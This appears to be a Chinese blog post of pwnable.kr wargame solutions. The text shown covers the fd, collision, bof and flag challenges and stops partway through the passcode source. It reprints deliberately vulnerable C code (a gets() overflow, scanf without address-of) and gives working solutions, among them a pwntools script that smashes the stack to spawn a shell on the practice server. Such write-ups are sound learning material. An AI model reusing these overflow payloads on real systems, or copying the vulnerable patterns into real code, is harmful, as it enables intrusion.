<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>Pwnable.kr Toddler's Bottle 练习记录 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="Pwnable.kr Toddler's Bottle 练习记录"><meta property="og:description" content="画风很可爱的 Pwn 题练习网站。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/pwnkr-toddler/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-10-09T21:19:11+00:00"><meta property="article:modified_time" content="2019-10-09T21:19:11+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Pwnable.kr Toddler's Bottle 练习记录"><meta name=twitter:description content="画风很可爱的 Pwn 题练习网站。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/pwnkr-toddler/><link rel=prev href=https://blog.sigmerc.top/ipv6-tunnel/><link rel=next href=https://blog.sigmerc.top/hackergame2019/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Pwnable.kr Toddler's Bottle 练习记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/pwnkr-toddler\/"},"genre":"posts","keywords":"Linux, C\/C\u002b\u002b, ARM, 整数溢出, 栈漏洞, 堆漏洞","wordcount":11516,"url":"https:\/\/blog.sigmerc.top\/pwnkr-toddler\/","datePublished":"2019-10-09T21:19:11+00:00","dateModified":"2019-10-09T21:19:11+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">Pwnable.kr Toddler's Bottle 练习记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>二进制安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2019-10-09>2019-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 11516 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 23 分钟&nbsp;<span id=/pwnkr-toddler/ class=leancloud_visitors data-flag-title="Pwnable.kr Toddler's Bottle 练习记录">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/0.jpg data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/0.jpg, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/0.jpg 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/0.jpg 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/0.jpg title=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/0.jpg></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#fd>fd</a></li><li><a href=#collision>collision</a></li><li><a href=#bof>bof</a></li><li><a href=#flag>flag</a></li><li><a href=#passcode>passcode</a></li><li><a href=#random>random</a></li><li><a href=#input>input</a></li><li><a href=#leg>leg</a></li><li><a href=#mistake>mistake</a></li><li><a href=#shellshock>shellshock</a></li><li><a href=#coin1>coin1</a></li><li><a href=#blackjack>blackjack</a></li><li><a href=#lotto>lotto</a></li><li><a href=#cmd1>cmd1</a></li><li><a href=#cmd2>cmd2</a></li><li><a href=#uaf>uaf</a></li><li><a href=#memcpy>memcpy</a></li><li><a href=#asm>asm</a></li><li><a href=#unlink>unlink</a></li><li><a href=#blukat>blukat</a></li><li><a href=#horcruxes>horcruxes</a></li></ul></nav></div></div><div class=content id=content><p>画风很可爱的 Pwn 题练习网站。</p><h2 id=fd>fd</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=o>&lt;</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;pass argv[1] a number</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=o>-</span> <span class=mh>0x1234</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>len</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=s>&#34;LETMEWIN</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;good job :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;learn about Linux file IO</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里需要传入一个命令行参数，用它减去 <code>0x1234</code> 后得到 <code>fd</code> 也就是 Linux 下的文件描述符，并读取对应的文件到 <code>buf</code> 中。我们当然可以创建一个文件，但是控制其 fd 比较麻烦；但我们知道，Linux 下标准输入流也有自己的 fd，即 0。因此我们只需要传入 <code>0x1234</code> 的十进制形式 <code>4660</code>，并在标准输入中输入 <code>LETMEWIN\n</code> 即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./fd <span class=m>4660</span>
</span></span><span class=line><span class=cl>LETMEWIN
</span></span></code></pre></td></tr></table></div></div><h2 id=collision>collision</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hashcode</span> <span class=o>=</span> <span class=mh>0x21DD09EC</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>check_password</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>p</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span><span class=o>*</span> <span class=n>ip</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>res</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>5</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>+=</span> <span class=n>ip</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>res</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=o>&lt;</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;usage : %s [passcode]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>strlen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>!=</span> <span class=mi>20</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;passcode length should be 20 bytes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>hashcode</span> <span class=o>==</span> <span class=n>check_password</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;wrong passcode.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>首先要求输入 20 字节的密码（显然是个 <code>char *</code>），然后将它强制转换为 <code>int *</code> 类型。我们知道，一个 <code>char</code> 是 1 字节，而一个 <code>int</code> 是 4 字节，因此 20 字节的 <code>char</code> 数组会变成 5 个 <code>int</code> 组成的 <code>int</code> 数组。</p><p>这 5 个 <code>int</code> 会被累加，然后要求其和等于 <code>hashcode</code>。换而言之随便找 5 个加起来等于 <code>hashcode</code> 的十六进制数就行了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python -c <span class=s1>&#39;print hex(0x21dd09ec-0x01010101*4)&#39;</span>
</span></span><span class=line><span class=cl>0x1dd905e8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ./col <span class=k>$(</span>python -c<span class=s1>&#39;print &#34;\xe8\x05\xd9\x1d&#34;+&#34;\x01&#34;*16&#39;</span><span class=k>)</span>
</span></span></code></pre></td></tr></table></div></div><p>注意默认小端法表示。</p><h2 id=bof>bof</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>func</span><span class=p>(</span><span class=kt>int</span> <span class=n>key</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>overflowme</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;overflow me :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>gets</span><span class=p>(</span><span class=n>overflowme</span><span class=p>);</span>	<span class=c1>// smash me!
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>key</span> <span class=o>==</span> <span class=mh>0xcafebabe</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Nah..</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>	<span class=n>func</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>从 IDA 中观察到 <code>overflowme</code> 在 <code>ebp-2c</code>，而 <code>key</code> 在 <code>ebp+8</code>，相差 <code>0x34</code>。栈上大概是这样的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> HIGH ADDRESS
</span></span><span class=line><span class=cl> ----------------------
</span></span><span class=line><span class=cl>| the states of main() | // caller
</span></span><span class=line><span class=cl> ----------------------
</span></span><span class=line><span class=cl>| args of func()       | // including key. Also in caller&#39;s state
</span></span><span class=line><span class=cl> ----------------------
</span></span><span class=line><span class=cl>| retaddr of func()    |
</span></span><span class=line><span class=cl> ----------------------
</span></span><span class=line><span class=cl>| saved ebp            | &lt;- ebp
</span></span><span class=line><span class=cl> ----------------------
</span></span><span class=line><span class=cl>| local vars of func() | // including overflowme[]
</span></span><span class=line><span class=cl> ----------------------  &lt;- esp
</span></span><span class=line><span class=cl> LOW ADDRESS
</span></span></code></pre></td></tr></table></div></div><p>了解这些后，我们用 <code>0x34</code> 字节数据作填充，然后用 <code>0xcafebabe</code> 覆盖掉 <code>key</code> 即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># p = process(&#39;./bof&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=mi>9000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x34</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xcafebabe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=flag>flag</h2><p>在 Hex-View 中发现是 UPX 加壳的，<code>upx -d</code> 脱壳。</p><p>脱壳后的程序提示会 <code>malloc</code> 然后 <code>strcpy</code> 本题的 flag，查看汇编代码，发现这里 flag 的变量名是 <code>cs:flag</code>，跟踪变量得到 flag。</p><h2 id=passcode>passcode</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>login</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>passcode1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>passcode2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;enter passcode1 :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>fflush</span><span class=p>(</span><span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;enter passcode2 :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;checking...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>passcode1</span><span class=o>==</span><span class=mi>338150</span> <span class=o>&amp;&amp;</span> <span class=n>passcode2</span><span class=o>==</span><span class=mi>13371337</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Login OK!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Login Failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>welcome</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
